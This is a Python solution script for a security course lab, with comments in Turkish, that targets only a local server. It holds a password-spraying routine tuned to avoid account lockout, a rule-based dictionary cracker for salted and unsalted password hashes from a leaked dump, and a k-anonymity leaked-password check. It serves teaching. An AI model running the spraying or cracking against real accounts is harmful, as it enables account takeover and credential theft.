"""Ders 5 labının hazır Python çözümleri. Yalnız yerel lab sunucusuna (127.0.0.1) bağlanır.

python -X utf8 lablar/hafta05/cozum.py 1              # password spraying
python -X utf8 lablar/hafta05/cozum.py 2              # sızan yedekte sözlük saldırısı
python -X utf8 lablar/hafta05/cozum.py 3              # k-anonymity ile sızıntı kontrolü
python -X utf8 lablar/hafta05/cozum.py 2 --port 8087  # düzeltilmiş sürüm
"""
from __future__ import annotations

import argparse
import hashlib
import json
import time
from urllib.error import HTTPError
from urllib.request import Request, urlopen


def fetch(port, path, data=None):
    body = None if data is None else json.dumps(data).encode()
    request = Request(f"http://127.0.0.1:{port}{path}", data=body, headers={"Content-Type": "application/json"})
    try:
        with urlopen(request, timeout=30) as response:
            return response.status, response.read().decode("utf-8")
    except HTTPError as error:
        return error.code, error.read().decode("utf-8")


def mutate(word, years):
    yield word
    yield word.capitalize()
    for year in years:
        yield word + year
        yield word.capitalize() + year + "!"


def spray(port):
    """Lab 1: çok hesap × az parola. Hesap başına 3 deneme; kilit (5) tetiklenmez."""
    fetch(port, "/api/lab1/reset", {"reset": True})
    info = json.loads(fetch(port, "/api/lab1/info")[1])
    found = []
    for password in info["spray_list"]:
        for user in info["guessed_names"]:
            status, _ = fetch(port, "/api/login", {"username": user, "password": password})
            if status == 200:
                found.append([user, password])
    return found


def crack(port, seconds=None):
    """Lab 2: sözlük + kurallar. Salt yoksa tek arama tablosu; salt varsa her kayıt ayrı hesaplanır."""
    dump = json.loads(fetch(port, "/api/lab2/dump")[1])
    words = json.loads(fetch(port, "/api/lab2/wordlist")[1])
    candidates = list(dict.fromkeys(g for w in words["words"] for g in mutate(w, words["years"])))
    found, started = [], time.perf_counter()
    if "sha256_hex" in dump["records"][0]:
        lookup = {hashlib.sha256(g.encode()).hexdigest(): g for g in candidates}
        found = [[r["user"], lookup[r["sha256_hex"]]] for r in dump["records"] if r["sha256_hex"] in lookup]
    else:
        open_records = list(dump["records"])
        for guess in candidates:
            for record in list(open_records):
                if seconds and time.perf_counter() - started > seconds:
                    return found
                digest = hashlib.pbkdf2_hmac("sha256", guess.encode(), bytes.fromhex(record["salt_hex"]), record["iterations"], 32)
                if digest.hex() == record["hash_hex"]:
                    found.append([record["user"], guess])
                    open_records.remove(record)
    return found


def check_password(port, password):
    """Lab 3: parolayı göndermeden sor. Sunucuya yalnız SHA-1 özetinin ilk 5 hex karakteri gider."""
    digest = hashlib.sha1(password.encode("utf-8")).hexdigest().upper()
    prefix, suffix = digest[:5], digest[5:]
    status, body = fetch(port, f"/api/lab3/range/{prefix}")
    counts = dict(line.split(":") for line in body.splitlines())
    return prefix, int(counts.get(suffix, "0"))


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("lab", type=int, choices=(1, 2, 3))
    parser.add_argument("--port", type=int, default=8086)
    parser.add_argument("--seconds", type=float, default=15, help="Lab 2 salt'lı yedekte süre sınırı")
    args = parser.parse_args()
    if args.lab == 1:
        pairs = spray(args.port)
        print("Bulunan hesaplar:", pairs or "yok")
        print("Sunucu doğrulaması:", fetch(args.port, "/api/check", {"lab": 1, "pairs": pairs})[1])
    elif args.lab == 2:
        pairs = crack(args.port, args.seconds)
        print(f"Kırılan kayıt: {len(pairs)}")
        for user, password in pairs:
            print(f"  {user}: {password}")
        if pairs:
            print("Sunucu doğrulaması:", fetch(args.port, "/api/check", {"lab": 2, "pairs": pairs})[1])
    else:
        for password in ("Sonbahar2026!", "123456", "kirmizi bisiklet sabah cayi"):
            prefix, seen = check_password(args.port, password)
            print(f"{password!r}: sunucuya giden={prefix} · listede={seen}")
